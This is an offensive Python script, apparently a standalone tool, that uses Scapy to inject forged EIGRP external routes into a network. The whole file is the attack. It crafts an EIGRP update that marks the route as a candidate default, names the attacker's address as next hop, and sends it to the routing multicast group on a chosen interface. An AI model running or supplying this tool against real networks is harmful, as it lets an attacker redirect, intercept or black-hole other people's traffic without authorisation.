#!/usr/bin/env python3


from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.layers.l2 import *
import argparse

print (r"""
███████╗██╗░██████╗░██████╗░██████╗░░██╗░░░░░░░██╗███╗░░██╗
██╔════╝██║██╔════╝░██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║
█████╗░░██║██║░░██╗░██████╔╝██████╔╝░╚██╗████╗██╔╝██╔██╗██║
██╔══╝░░██║██║░░╚██╗██╔══██╗██╔═══╝░░░████╔═████║░██║╚████║
███████╗██║╚██████╔╝██║░░██║██║░░░░░░░╚██╔╝░╚██╔╝░██║░╚███║
╚══════╝╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝
    """)

print ("EIGRP External routes injection tool")
print("\nAuthor: @necreas1ng, <necreas1ng@protonmail.com>\n")



L2Multicast = "01:00:5E:00:00:0A"
EIGRPMulticast = "224.0.0.10"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True, help="Choose the interface to attack")
    parser.add_argument("--asn", type=int, dest="asn", required=True, help="Specify the EIGRP AS Number")
    parser.add_argument("--src", type=str, dest="source_ip", required=True, help="Specify your IP Address")
    parser.add_argument("--dst", type=str, dest="destination_ip", required=True, help="Target IP address for injection")
    parser.add_argument("--prefix", type=int, dest="prefix", required=True, help="Specifying the subnet mask")
    
    args = parser.parse_args()

    return args


args = get_arguments()


def inject(interface, asn, source_ip, destination_ip, prefix):
    frame = Ether(dst=L2Multicast)
    ip = IP(src=args.source_ip, dst=EIGRPMulticast, ttl=1)
    eigrp = EIGRP(opcode=1, asn=args.asn, seq=0, ack=0, tlvlist=[EIGRPExtRoute(dst=args.destination_ip, nexthop=args.source_ip, originrouter=args.source_ip, prefixlen=args.prefix, flags="candidate-default")])
    crafted = frame/ip/eigrp
    print("[+] Starting injecting external routes...")
    sendp(crafted, iface=args.interface, loop=0, verbose=1)




inject(args.interface, args.asn, args.source_ip, args.destination_ip, args.prefix)

